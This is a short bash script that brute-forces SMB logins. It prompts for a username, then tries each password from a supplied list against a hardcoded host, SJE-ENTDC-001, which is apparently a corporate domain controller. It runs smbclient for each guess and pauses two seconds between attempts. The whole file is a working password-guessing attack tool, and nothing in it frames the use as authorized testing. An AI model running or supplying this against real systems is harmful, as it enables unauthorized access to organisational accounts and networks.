#!/bin/bash
# Usage: ./smbclient.sh pass_file.txt

clear
echo "Welcome to the 'brute-force' smbclient bash script. "

# Ask for username
echo "Please enter the username below. (Note: backslash requires escape, 'CORP\\\\user')"
read -p "Username: " user

# Read in password list
while IFS='' read -r password || [[ -n "$password" ]]; do

echo ""
echo "Testing password via: smbclient -U $user%$password -L SJE-ENTDC-001"

# Command
smbclient -U "$user"%"$password" -L SJE-ENTDC-001

# Sleep & done!
sleep 2
done < "$1"
